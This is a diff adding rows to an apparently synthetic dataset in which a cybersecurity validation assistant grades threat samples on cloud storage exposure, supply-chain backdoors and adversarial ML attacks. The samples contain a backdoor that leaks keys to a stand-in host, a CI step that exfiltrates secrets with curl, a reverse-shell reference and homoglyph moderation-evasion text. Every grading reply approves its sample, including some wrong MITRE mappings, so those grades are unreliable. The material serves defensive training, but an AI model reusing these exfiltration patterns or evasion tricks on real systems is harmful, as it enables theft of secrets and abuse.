+  ""detection_method"": ""Use GCP Security Command Center or custom scripts to audit bucket IAM policies for allUsers or allAuthenticatedUsers bindings; monitor access logs for unauthenticated object retrievals; automate alerts on sensitive filename patterns and large downloads from public buckets."",
+  ""relevant_mitre_techniques"": [
+    ""T1530 - Data from Cloud Storage Object"",
+    ""T1078 - Valid Accounts"",
+    ""T1087 - Account Discovery""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": true, ""issues"": [], ""comments"": ""The sample accurately represents a misconfigured cloud storage bucket scenario in Google Cloud Storage (GCS) where the IAM policy grants the 'allUsers' member the 'storage.objectViewer' role, leading to public exposure of sensitive internal documents. The technical data includes relevant and realistic artifacts such as the IAM policy JSON, the gcloud command to retrieve the policy, access log entries showing anonymous access, HTTP request examples, bucket listing responses, and even sample PDF metadata, all of which support the scenario. The indicators clearly explain why this is a misconfiguration and how it leads to data leakage. The detection method is appropriate and aligns with recommended risk reduction strategies, including automated policy audits and monitoring access logs. The inclusion of relevant MITRE ATT&CK techniques adds further context. Overall, the sample is complete, realistic, and correctly aligned with the problem nature.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: Cloud Security
+- Nature: misconfigured_storage
+- Description: Misconfigured cloud storage buckets or services exposing sensitive data publicly or to unauthorized users, leading to data breaches or leakage.
+- Risk Reduction: Implement automated configuration scanning and compliance checks, Enforce least privilege access controls and role-based access, Use cloud provider security posture management (CSPM) tools
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""Azure Blob Storage container set to 'Container (anonymous read access for containers and blobs)' allowing external actors to download internal backup archives containing database dumps."",
+  ""technical_data"": {
+    ""azure_blob_public_access_setting"": ""Public Access Level: Container"",
+    ""azure_cli_get_access_level"": ""az storage container show --account-name corpstorageacct --name db-backups --query 'publicAccess'"",
+    ""response"": ""\""container\"""",
+    ""azure_storage_logs"": ""[\n  {\n    \""time\"": \""2024-06-01T12:00:00Z\"",\n    \""requestId\"": \""eabc1234-5678-90ab-cdef-111111111111\"",\n    \""operationName\"": \""GetBlob\"",\n    \""statusCode\"": 200,\n    \""authenticationType\"": \""Anonymous\"",\n    \""url\"": \""https://corpstorageacct.blob.core.windows.net/db-backups/prod-db-20240601.bak\"",\n    \""clientIpAddress\"": \""198.51.100.23\"",\n    \""userAgent\"": \""Wget/1.20.3 (linux-gnu)\""\n  }\n]"",
+    ""wget_command"": ""wget https://corpstorageacct.blob.core.windows.net/db-backups/prod-db-20240601.bak"",
+    ""blob_list_response"": ""{\n  \""Blobs\"": [\n    {\n      \""Name\"": \""prod-db-20240601.bak\"",\n      \""Properties\"": {\n        \""contentLength\"": 524288000,\n        \""contentType\"": \""application/octet-stream\""\n      }\n    },\n    {\n      \""Name\"": \""dev-db-20240531.bak\"",\n      \""Properties\"": {\n        \""contentLength\"": 524288000,\n        \""contentType\"": \""application/octet-stream\""\n      }\n    }\n  ]\n}"",
+    ""suspect_backup_file_preview"": ""MSSQL Database Backup Header:\nDatabase Name: ProdDB\nBackup Type: Full\nBackup Start Date: 2024-06-01 00:00:00\nBackup Finish Date: 2024-06-01 01:15:30\n""
+  },
+  ""indicators"": [
+    ""Azure Blob container public access level set to 'container' or 'blob'"",
+    ""Storage analytics logs showing anonymous GetBlob operations from external IPs"",
+    ""Presence of large .bak files (database backups) downloadable without authentication"",
+    ""Command-line downloads using wget or curl from blob URLs""
+  ],
+  ""detection_method"": ""Configure Azure Policy to disallow public read access to sensitive storage containers; enable and review Storage Analytics Logging for anonymous access patterns; use Azure Defender for Storage to detect unusual access; alert on downloads of backup file extensions from publicly accessible containers."",
+  ""relevant_mitre_techniques"": [
+    ""T1530 - Data from Cloud Storage Object"",
+    ""T1537 - Transfer Data to Cloud Account"",
+    ""T1110 - Brute Force (if used to escalate access)""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": true, ""issues"": [], ""comments"": ""The sample accurately represents a misconfigured cloud storage scenario in Azure Blob Storage where the container is set to allow anonymous read access, exposing sensitive database backup files. The scenario description is clear and aligns well with the problem nature. The technical data includes relevant and realistic evidence such as the public access setting, CLI commands, storage logs showing anonymous access, wget command usage, and file previews, all supporting the exposure claim. Indicators are well articulated and directly explain why this is a misconfiguration leading to data exposure. The detection methods are appropriate and reflect best practices for risk reduction, including policy enforcement, logging, and alerting. The inclusion of relevant MITRE ATT&CK techniques adds value for threat context. Overall, the sample is complete, realistic, and technically correct, making it a valid representation of the stated problem.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: Supply Chain
+- Nature: third_party_compromise
+- Description: Adversaries compromise software or hardware suppliers to insert malicious code or backdoors, impacting downstream customers and organizations.
+- Risk Reduction: Conduct thorough vendor risk assessments and continuous monitoring, Implement software bill of materials (SBOM) and integrity verification, Use zero trust principles for supply chain access
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""Malicious code inserted into a widely used open-source software library by a compromised vendor, leading to supply chain infection of downstream applications."",
+  ""technical_data"": {
+    ""git_commit_diff"": ""diff --git a/src/utils/encryption.js b/src/utils/encryption.js\nindex a1b2c3d..d4e5f6a 100644\n--- a/src/utils/encryption.js\n+++ b/src/utils/encryption.js\n@@ -45,6 +45,13 @@ function encrypt(data, key) {\n     // Original encryption logic\n     return crypto.createCipher('aes-256-cbc', key).update(data, 'utf8', 'hex');\n }\n+\n+// Malicious backdoor function inserted by attacker\n+function leakKey() {\n+    const http = require('http');\n+    const os = require('os');\n+    const key = process.env.ENCRYPTION_KEY || 'default_key';\n+    const options = {\n+        hostname: 'malicious.example.com',\n+        port: 80,\n+        path: '/leak?host=' + os.hostname() + '&key=' + key,\n+        method: 'GET'\n+    };\n+    const req = http.request(options);\n+    req.end();\n+}\n+\n+// Call backdoor on every encryption\n+encrypt = (function(original) {\n+    return function(data, key) {\n+        leakKey();\n+        return original(data, key);\n+    }\n+})(encrypt);\n"",
+    ""sbom_snippet"": ""{\n  \""name\"": \""vulnerable-utils\"",\n  \""version\"": \""2.1.0\"",\n  \""components\"": [\n    {\n      \""type\"": \""library\"",\n      \""name\"": \""crypto\"",\n      \""version\"": \""1.0.0\"",\n      \""hashes\"": {\n        \""sha256\"": \""3a5b1e0c9d3f7c6b05f8a9a2e7f9a0b6f4c3d2e7f8a9b0c1d2e3f4a5b6c7d8e9\""\n      }\n    }\n  ]\n}"",
+    ""network_http_request"": ""GET /leak?host=victims-host-123&key=supersecretkey123 HTTP/1.1\r\nHost: malicious.example.com\r\nUser-Agent: nodejs-http-client/1.0\r\nConnection: close\r\n\r\n"",
+    ""server_log_entry"": ""Apr 15 14:32:10 victim-host app[1234]: Executed encrypt() with key from env variable.\nApr 15 14:32:10 victim-host nodejs: HTTP GET request sent to malicious.example.com with encryption key leak."",
+    ""process_tree"": ""node (pid=1234) -> encryption.js (module) -> leakKey() -> http.request()"",
+    ""hashes"": {
+      ""file"": {
+        ""SHA256"": ""e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855""
+      }
+    }
+  },
+  ""indicators"": [
+    ""HTTP GET request to http://malicious.example.com/leak with sensitive query parameters"",
+    ""Unexpected outbound HTTP requests from internal encryption library"",
+    ""Malicious git commit modifying encryption function to exfiltrate keys"",
+    ""SBOM mismatch with vendor-reported hashes"",
+    ""Process tree showing encryption function spawning HTTP requests""
+  ],
+  ""detection_method"": ""Monitor outbound HTTP requests from internal libraries; verify SBOM hashes against vendor releases; scan code changes for suspicious additions; alert on process spawning unexpected network connections."",
+  ""relevant_mitre_techniques"": [
+    ""T1195 - Supply Chain Compromise"",
+    ""T1041 - Exfiltration Over C2 Channel"",
+    ""T1071.001 - Web Protocols"",
+    ""T1609 - Container and Resource Discovery""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": true, ""issues"": [], ""comments"": ""The sample accurately represents a third-party compromise in the supply chain by showing malicious code inserted into a widely used open-source library by a compromised vendor. The technical data includes a realistic git commit diff illustrating the backdoor insertion, an SBOM snippet to support integrity verification, network request logs demonstrating data exfiltration, process tree details, and file hashes. The indicators clearly explain why this scenario matches the problem nature, highlighting suspicious network activity, code changes, and SBOM mismatches. The detection methods align well with recommended risk reduction strategies such as monitoring outbound requests, verifying SBOMs, and scanning code changes. The inclusion of relevant MITRE ATT&CK techniques further supports the scenario's validity. Overall, the sample is complete, realistic, and correctly aligned with the problem description.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: Supply Chain
+- Nature: third_party_compromise
+- Description: Adversaries compromise software or hardware suppliers to insert malicious code or backdoors, impacting downstream customers and organizations.
+- Risk Reduction: Conduct thorough vendor risk assessments and continuous monitoring, Implement software bill of materials (SBOM) and integrity verification, Use zero trust principles for supply chain access
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""Compromised hardware vendor firmware update containing a hidden backdoor that allows remote code execution on affected devices used by enterprise customers."",
+  ""technical_data"": {
+    ""firmware_file_hashes"": {
+      ""MD5"": ""5d41402abc4b2a76b9719d911017c592"",
+      ""SHA1"": ""2aae6c35c94fcfb415dbe95f408b9ce91ee846ed"",
+      ""SHA256"": ""9e107d9d372bb6826bd81d3542a419d6f7a9e0f4a1a7a692f7e99d8ab5f9d4b8""
+    },
+    ""firmware_update_log"": ""2024-06-10T08:33:45Z [fw_update] Firmware version 3.2.1 received from vendor\n2024-06-10T08:33:46Z [fw_update] Hash verification passed\n2024-06-10T08:33:47Z [fw_update] Applying firmware update...\n2024-06-10T08:33:50Z [fw_update] Firmware update applied successfully\n"",
+    ""disassembled_backdoor_snippet"": ""0x1a2b3c: MOV R0, #0x1\n0x1a2b3e: LDR R1, =0xdeadbeef\n0x1a2b42: BLX 0x10001000 ; call to suspicious function\n0x1a2b46: STR R1, [SP, #0x20]\n; Function at 0x10001000 establishes reverse shell to 192.168.99.99:4444\n"",
+    ""network_c2_traffic"": ""22:15:33.123456 IP device-host.12345 > 192.168.99.99.4444: Flags [S], seq 0, win 65535, options [mss 1460], length 0\n22:15:33.123789 IP 192.168.99.99.4444 > device-host.12345: Flags [S.], seq 0, ack 1, win 65535, length 0\n22:15:33.124000 IP device-host.12345 > 192.168.99.99.4444: Flags [.], ack 1, win 65535, length 0"",
+    ""registry_artifacts"": ""HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\BackdoorService\n\""Start\""=dword:00000002\n\""ImagePath\""=\""C:\\\\Windows\\\\System32\\\\backdoor.exe\"""",
+    ""process_creation_log"": ""2024-06-10T22:15:34Z SYSTEM: Created process backdoor.exe with args '-connect 192.168.99.99:4444'"",
+    ""device_model"": ""VendorX Model YZ123""
+  },
+  ""indicators"": [
+    ""Firmware hash mismatch with vendor official releases"",
+    ""Presence of suspicious function calls in firmware disassembly (e.g., calls to 0x10001000)"",
+    ""Outbound TCP connection to unusual IP and port (192.168.99.99:4444) immediately after update"",
+    ""Registry keys indicating persistence of backdoor service"",
+    ""Unexpected process creation of backdoor.exe following firmware update""
+  ],
+  ""detection_method"": ""Firmware integrity verification with out-of-band hashes; monitor network connections from devices post-update; analyze firmware static and dynamic behavior; alert on new persistent services after firmware updates; validate device behavior against baseline."",
+  ""relevant_mitre_techniques"": [
+    ""T1195.002 - Supply Chain Compromise: Compromise Hardware Supply Chain"",
+    ""T1059 - Command and Scripting Interpreter"",
+    ""T1105 - Ingress Tool Transfer"",
+    ""T1543 - Create or Modify System Process"",
+    ""T1071 - Application Layer Protocol""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": true, ""issues"": [], ""comments"": ""The sample accurately represents a third-party compromise in the supply chain by describing a compromised hardware vendor firmware update containing a hidden backdoor. The scenario aligns well with the problem nature of inserting malicious code via supplier compromise. The technical data is detailed and realistic, including firmware hashes, update logs, disassembled backdoor code, network C2 traffic, registry artifacts, and process creation logs, all of which support the indicators provided. The indicators clearly explain why this sample matches the problem, highlighting hash mismatches, suspicious function calls, unusual outbound connections, persistence mechanisms, and unexpected processes. The detection methods and relevant MITRE techniques are appropriate and comprehensive. All required fields are present and accurately populated. Overall, this sample is complete, realistic, and correctly aligned with the stated cybersecurity problem.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: Supply Chain
+- Nature: third_party_compromise
+- Description: Adversaries compromise software or hardware suppliers to insert malicious code or backdoors, impacting downstream customers and organizations.
+- Risk Reduction: Conduct thorough vendor risk assessments and continuous monitoring, Implement software bill of materials (SBOM) and integrity verification, Use zero trust principles for supply chain access
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""Adversary compromises a third-party CI/CD pipeline tool by injecting a malicious step that exfiltrates environment secrets to attacker-controlled server, impacting multiple organizations using the shared service."",
+  ""technical_data"": {
+    ""ci_cd_pipeline_yml"": ""steps:\n  - name: Build\n    run: npm run build\n  - name: Test\n    run: npm test\n  - name: Malicious Exfiltration\n    run: |\n      curl -X POST -H 'Content-Type: application/json' -d '{\""env\"": \""$SECRET_API_KEY\""}' http://evil-ci-exfiltrator.com/api/leak\n"",
+    ""ci_cd_logs"": ""2024-05-30T12:05:00Z Runner executing step 'Malicious Exfiltration'\n2024-05-30T12:05:01Z POST http://evil-ci-exfiltrator.com/api/leak HTTP/1.1 200 OK\n2024-05-30T12:05:01Z Payload: {\""env\"": \""AKIAIOSFODNN7EXAMPLE\""}\n"",
+    ""network_capture"": ""POST /api/leak HTTP/1.1\r\nHost: evil-ci-exfiltrator.com\r\nContent-Type: application/json\r\nContent-Length: 40\r\n\r\n{\""env\"": \""AKIAIOSFODNN7EXAMPLE\""}\r\n"",
+    ""domain_registration"": ""Domain Name: evil-ci-exfiltrator.com\nRegistry Expiry Date: 2025-05-30\nRegistrant Organization: PrivacyProtect.org\nName Servers: ns1.privacyns.com, ns2.privacyns.com"",
+    ""environment_variable_sample"": ""SECRET_API_KEY=AKIAIOSFODNN7EXAMPLE\n"",
+    ""access_logs"": ""10.0.0.5 - - [30/May/2024:12:05:01 +0000] \""POST /api/leak HTTP/1.1\"" 200 15 \""-\"" \""curl/7.68.0\"""",
+    ""process_tree"": ""runner(5678) -> sh(5680) -> curl(5690)""
+  },
+  ""indicators"": [
+    ""CI/CD pipeline step running unexpected HTTP POST to external domain"",
+    ""Secrets environment variables sent in HTTP payload to suspicious domain"",
+    ""Domain with privacy-protected WHOIS and recent registration"",
+    ""Network logs showing data exfiltration during build steps"",
+    ""Process chain showing curl executed from CI runner context""
+  ],
+  ""detection_method"": ""Monitor CI/CD pipeline steps for external network calls; scan pipeline configurations for suspicious commands; alert on transmission of secrets in plaintext over HTTP; DNS monitoring for newly registered or privacy-protected domains; employ secrets scanning in logs and config files."",
+  ""relevant_mitre_techniques"": [
+    ""T1195 - Supply Chain Compromise"",
+    ""T1071.001 - Web Protocols"",
+    ""T1083 - File and Directory Discovery"",
+    ""T1552 - Unsecured Credentials"",
+    ""T1114 - Email Collection (if email credentials exfiltrated)""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": true, ""issues"": [], ""comments"": ""The sample accurately represents a third-party compromise in the supply chain context by illustrating an adversary injecting malicious code into a CI/CD pipeline tool, which is a plausible real-world scenario. All required fields are present and well populated, including a detailed scenario description, comprehensive technical data with configuration, logs, network captures, domain info, environment variables, access logs, and process trees. The indicators clearly explain why this sample matches the problem nature, highlighting suspicious pipeline steps, exfiltration of secrets, domain registration details, network logs, and process execution context. The detection methods align well with recommended risk reduction strategies such as monitoring pipeline steps, scanning configurations, secrets scanning, and DNS monitoring. The inclusion of relevant MITRE ATT&CK techniques further supports the scenario's validity. Overall, the sample is complete, realistic, and correctly aligned with the problem statement. For improvement, consider explicitly referencing risk reduction measures like SBOM or zero trust principles in the detection or comments to strengthen the linkage to the problem's risk mitigation guidance.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: AI/ML Threats
+- Nature: adversarial_ml_attack
+- Description: Attackers craft inputs to machine learning models that cause misclassification or erroneous outputs, undermining AI-driven security or business systems.
+- Risk Reduction: Use robust ML model training with adversarial examples, Implement input validation and anomaly detection on ML pipelines, Continuously monitor model performance and retrain as needed
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""Adversarial image input crafted to evade a malware detection model in an AI-driven endpoint security solution"",
+  ""technical_data"": {
+    ""attack_description"": ""An attacker crafts a PNG image with imperceptible perturbations that cause the AI malware classifier to misclassify a malicious payload embedded in the image as benign."",
+    ""adversarial_image_metadata"": {
+      ""file_name"": ""invoice_2024_q2.png"",
+      ""md5"": ""d41d8cd98f00b204e9800998ecf8427e"",
+      ""sha256"": ""3a7bd3e2360a7f4a5c4a7d5a9b5e28d1a6e9f2e2ba9f7a3d4c5e1f7a2e7a3c9e"",
+      ""file_size_bytes"": 245760,
+      ""image_dimensions"": ""1024x768"",
+      ""embedded_payload_type"": ""PE executable (malware)""
+    },
+    ""model_input_vector"": ""Original pixel RGB values with L2 norm perturbation of 0.012 applied selectively to pixels in the red channel"",
+    ""payload_embedding_technique"": ""Least Significant Bit (LSB) steganography combined with adversarial noise"",
+    ""sample_model_input_snippet"": [
+      {
+        ""pixel"": [
+          123,
+          117,
+          110
+        ],
+        ""perturbed_pixel"": [
+          125,
+          117,
+          110
+        ],
+        ""perturbation_value"": 2
+      },
+      {
+        ""pixel"": [
+          98,
+          102,
+          99
+        ],
+        ""perturbed_pixel"": [
+          100,
+          102,
+          99
+        ],
+        ""perturbation_value"": 2
+      }
+    ],
+    ""endpoint_security_log_snippet"": [
+      ""2024-06-15 13:42:07,983 - MLModel - INFO - Image scanned: invoice_2024_q2.png, predicted_label=benign, confidence=0.97"",
+      ""2024-06-15 13:42:07,985 - EndpointAgent - WARN - Suspicious process creation detected: powershell.exe -EncodedCommand ..."",
+      ""2024-06-15 13:42:08,010 - FileMonitor - ERROR - Executable extracted from image payload detected as malware by heuristic engine""
+    ],
+    ""payload_code_snippet"": ""MZ\\x90\\x00\\x03\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\xff\\xff\\x00\\x00 ... (PE header start)"",
+    ""adversarial_generation_code_snippet"": ""import torch\nfrom torchvision import transforms\n\n# Assume pretrained malware classifier model\n# Generate adversarial perturbations using FGSM\n\ndef fgsm_attack(image, epsilon, data_grad):\n    sign_data_grad = data_grad.sign()\n    perturbed_image = image + epsilon*sign_data_grad\n    perturbed_image = torch.clamp(perturbed_image, 0, 1)\n    return perturbed_image\n\n# image: input tensor, label: true label\n# epsilon: perturbation magnitude\n""
+  },
+  ""indicators"": [
+    ""High confidence benign classification for images containing embedded executable payloads"",
+    ""Endpoint logs showing suspicious PowerShell execution immediately after image scan"",
+    ""Unusual process spawning correlated with image file ingestion"",
+    ""File hash (MD5) known to be associated with adversarial payload"",
+    ""Mismatch between heuristic engine detection and ML model prediction""
+  ],
+  ""detection_method"": ""Implement anomaly detection on model confidence scores vs heuristic detections, monitor for sudden high-confidence benign results on images with embedded executable content, correlate endpoint process creation logs with ML model predictions, and perform adversarial training with known perturbations to harden the model."",
+  ""relevant_mitre_techniques"": [
+    ""T1566.001 - Phishing: Spearphishing Attachment (embedding payload in images)"",
+    ""T1499 - Endpoint Denial of Service (causing misclassification to evade detection)"",
+    ""T1059 - Command and Scripting Interpreter (powershell execution)"",
+    ""T1204 - User Execution (payload execution post-delivery)"",
+    ""T1553 - Subvert Trust Controls (adversarial modification of inputs)""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": true, ""issues"": [], ""comments"": ""The sample accurately represents an adversarial ML attack scenario where an attacker crafts an image input with imperceptible perturbations to evade detection by an AI-driven malware classifier. The scenario is realistic and plausible in endpoint security contexts, especially with steganography embedding executable payloads. All required fields are present and well populated, including detailed technical data such as attack description, metadata, model input perturbations, code snippets for adversarial generation, and relevant endpoint logs. The indicators clearly explain why this is an adversarial ML attack, highlighting the mismatch between high-confidence benign predictions and heuristic detections, as well as suspicious endpoint activity. The detection method aligns well with recommended risk reduction strategies, emphasizing anomaly detection, correlation of logs, and adversarial training. The inclusion of relevant MITRE ATT&CK techniques further strengthens the completeness and contextual relevance of the sample. Overall, this sample is comprehensive, technically sound, and well aligned with the stated problem of adversarial ML attacks.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: AI/ML Threats
+- Nature: adversarial_ml_attack
+- Description: Attackers craft inputs to machine learning models that cause misclassification or erroneous outputs, undermining AI-driven security or business systems.
+- Risk Reduction: Use robust ML model training with adversarial examples, Implement input validation and anomaly detection on ML pipelines, Continuously monitor model performance and retrain as needed
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""Adversarial text input to a natural language processing (NLP) model used in automated content moderation causes misclassification of toxic content as benign"",
+  ""technical_data"": {
+    ""attack_description"": ""An attacker uses synonym substitution and homoglyph Unicode characters in a toxic phrase that bypasses automated NLP toxicity detection by causing the model to misclassify the text as non-toxic."",
+    ""original_text"": ""You are a horrible person and should die."",
+    ""adversarial_text"": ""You are a h0rrible person and sh0uld d\u00eee."",
+    ""unicode_homoglyphs_used"": {
+      ""o"": ""0 (U+0030)"",
+      ""i"": ""\u00ee (U+00EE)""
+    },
+    ""synonym_substitution"": {
+      ""die"": ""d\u00eee"",
+      ""should"": ""sh0uld""
+    },
+    ""http_request"": ""POST /api/moderate HTTP/1.1\r\nHost: content-moderation.example.com\r\nContent-Type: application/json\r\nContent-Length: 89\r\n\r\n{\""text\"":\""You are a h0rrible person and sh0uld d\u00eee.\""}"",
+    ""model_response"": ""{\""toxicity_score\"":0.12,\""is_toxic\"":false}"",
+    ""server_log_entry"": ""2024-06-14T09:15:12.543Z [INFO] RequestID=fa3e7c91 POST /api/moderate - userID=123456 - text='You are a h0rrible person and sh0uld d\u00eee.' - classified_toxic=false - confidence=0.88"",
+    ""adversarial_generation_snippet"": ""def substitute_homoglyphs(text):\n    mapping = {'o': '0', 'i': '\u00ee'}\n    return ''.join(mapping.get(c, c) for c in text)\n\n# Apply synonym and homoglyph substitution\ntext = \""You are a horrible person and should die.\""\nadversarial_text = substitute_homoglyphs(text).replace('die', 'd\u00eee').replace('should', 'sh0uld')""
+  },
+  ""indicators"": [
+    ""Mismatch between toxic content as perceived by human moderators and low toxicity scores from the model"",
+    ""Presence of Unicode homoglyphs and unusual character substitutions in input text"",
+    ""Increased false-negative rate on inputs containing homoglyph substitutions"",
+    ""HTTP POST requests with JSON payloads containing suspicious Unicode characters"",
+    ""Anomalies in confidence score distribution compared to baseline""
+  ],
+  ""detection_method"": ""Implement input normalization and Unicode homoglyph detection before classification, apply adversarial training with such obfuscated inputs, perform anomaly detection on input character distributions, monitor model confidence shifts, and augment with human-in-the-loop review for borderline cases."",
+  ""relevant_mitre_techniques"": [
+    ""T1204 - User Execution (malicious input acceptance)"",
+    ""T1059.007 - Command and Scripting Interpreter: JavaScript (web-based input manipulation)"",
+    ""T1566 - Phishing (social engineering via toxic messages)"",
+    ""T1553.002 - Subvert Trust Controls: Code Signing (model input manipulation)"",
+    ""T1622 - Develop Capabilities: Adversary-in-the-Middle (input tampering)""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": true, ""issues"": [], ""comments"": ""The sample accurately represents an adversarial ML attack scenario targeting an NLP model for content moderation, aligning well with the problem nature. The scenario is realistic, as attackers commonly use homoglyphs and synonym substitutions to evade toxicity detection. All required fields are present and detailed, including a clear scenario description, technical data with examples of original and adversarial inputs, HTTP request, model response, server logs, and code snippet illustrating adversarial text generation. The indicators effectively highlight key signs of adversarial manipulation, such as mismatches in toxicity classification, presence of homoglyphs, and anomalies in confidence scores. The detection methods are appropriate and comprehensive, covering input normalization, adversarial training, anomaly detection, and human review. The inclusion of relevant MITRE techniques adds valuable context. Overall, the sample is complete, correct, and realistic, providing a strong example of the stated problem.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: AI/ML Threats
+- Nature: adversarial_ml_attack
+- Description: Attackers craft inputs to machine learning models that cause misclassification or erroneous outputs, undermining AI-driven security or business systems.
+- Risk Reduction: Use robust ML model training with adversarial examples, Implement input validation and anomaly detection on ML pipelines, Continuously monitor model performance and retrain as needed
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""Adversarial numeric input crafted to manipulate a fraud detection ML model in a financial transaction pipeline causing fraudulent transactions to be classified as legitimate"",
+  ""technical_data"": {
+    ""attack_description"": ""An attacker crafts transaction metadata with subtle perturbations in transaction amount and timing features that exploit model decision boundaries, causing fraudulent transactions to evade detection."",
+    ""sample_transaction_record"": {
+      ""transaction_id"": ""TXN-20240615-998877"",
+      ""user_id"": ""987654321"",
+      ""amount_usd"": 4999.99,
+      ""timestamp"": ""2024-06-15T20:15:47Z"",
+      ""merchant_category"": ""electronics"",
+      ""device_id"": ""device_abc123"",
+      ""location"": ""New York, NY"",
+      ""model_features"": {
+        ""amount"": 4999.99,
+        ""hour_of_day"": 20,
+        ""day_of_week"": 5,
+        ""merchant_risk_score"": 0.7,
+        ""device_trust_score"": 0.85,
+        ""historical_user_fraud_rate"": 0.02
+      },
+      ""model_prediction"": {
+        ""fraud_probability"": 0.08,
+        ""is_fraud"": false,
+        ""confidence"": 0.92
+      }
+    },
+    ""perturbation_strategy"": ""Add small noise to 'amount' feature (+/- $0.10) and shift 'hour_of_day' by +/- 1 hour to fall below fraud detection threshold of 0.1 probability"",
+    ""model_decision_boundary"": ""Fraud probability threshold = 0.10"",
+    ""feature_vector_before_attack"": {
+      ""amount"": 5000.0,
+      ""hour_of_day"": 21,
+      ""merchant_risk_score"": 0.7,
+      ""device_trust_score"": 0.85,
+      ""historical_user_fraud_rate"": 0.02
+    },
+    ""feature_vector_after_attack"": {
+      ""amount"": 4999.99,
+      ""hour_of_day"": 20,
+      ""merchant_risk_score"": 0.7,
+      ""device_trust_score"": 0.85,
+      ""historical_user_fraud_rate"": 0.02
+    },
+    ""transaction_pipeline_log"": [
+      ""2024-06-15T20:15:48Z INFO TransactionProcessor: Received transaction TXN-20240615-998877"",
+      ""2024-06-15T20:15:48Z DEBUG MLModel: Features extracted: {'amount': 4999.99, 'hour_of_day': 20, 'merchant_risk_score': 0.7, 'device_trust_score': 0.85, 'historical_user_fraud_rate': 0.02}"",
+      ""2024-06-15T20:15:48Z DEBUG MLModel: Fraud probability score: 0.08 (below threshold 0.10), marking transaction as non-fraudulent"",
+      ""2024-06-15T20:15:48Z INFO TransactionProcessor: Transaction TXN-20240615-998877 approved""
+    ],
+    ""adversarial_perturbation_script_snippet"": ""def perturb_features(transaction):\n    import random\n    transaction['amount'] -= 0.01  # subtle decrease\n    transaction['hour_of_day'] = max(0, transaction['hour_of_day'] - 1)\n    return transaction\n\n# Apply perturbation to crafted fraudulent transactions before sending to model""
+  },
+  ""indicators"": [
+    ""Transactions just below fraud detection threshold repeatedly approved"",
